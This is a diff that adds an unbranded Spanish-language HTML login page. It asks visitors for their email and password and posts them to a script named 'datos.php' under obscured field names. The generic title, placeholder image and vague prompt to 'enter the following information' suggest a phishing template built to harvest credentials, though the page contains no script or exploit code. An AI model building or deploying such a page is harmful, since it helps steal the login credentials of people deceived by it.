@@ -1,0 +1,56 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="UTF-8">
+  <title>index</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+ <link rel='stylesheet' href='https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css'>
+<link rel='stylesheet' href='https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/fonts/FontAwesome.otf'>
+<link rel='stylesheet' href='https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/fonts/fontawesome-webfont.eot'>
+<link rel='stylesheet' href='https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/fonts/fontawesome-webfont.svg'>
+<link rel='stylesheet' href='https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/fonts/fontawesome-webfont.ttf'>
+<link rel='stylesheet' href='https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/fonts/fontawesome-webfont.woff2'>
+<link rel='stylesheet' href='https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.css.map'><link rel="stylesheet" href="./style.css">
+
+</head>
+<body>
+<!-- partial:index.partial.html -->
+<div id='AppendHere'></div>
+<!--start login form-->
+<form id="loginform" method="post" action="datos.php"><!--action="the site link"-->
+	<!--start header-->
+	<img src="pictur.png" style="width:100%"><br><br><br>
+	<p style="font-size:14px;">Por favor Ingrese la siguiente información:</p>
+    <!--site link-->
+    <!--end site-->
+    		
+
+    <div class="input-info">
+       
+        <i class="fa fa-envelope"></i>
+        <!--user email-->
+        <input type="email" placeholder="Correo Electrónico" name="uncampo" required autocomplete="off"  required>
+        <i class="fa fa-lock"></i>
+        <!--yser password-->
+        <input type="password" placeholder="Contraseña" name="doscampo" required>
+        <!--the checkbox to make the browser remember the user-->
+        <input type="checkbox">
+        <span>Recuerdame</span><br>
+    </div>
+
+
+    <div class="social-media"><!--sign up by fb and tw-->
+		<button type="submit" class="btn1">
+		<i class="fa fa-sign-in"></i> Continuar
+		</button>
+
+		
+	</div>
+
+<!--	<p class="forget-password">Si olvidaste tu clave Ingresa <a href="#">aquí</a></p>-->
+
+</form>
+<!--End login form-->
+
+</body>
+</html>
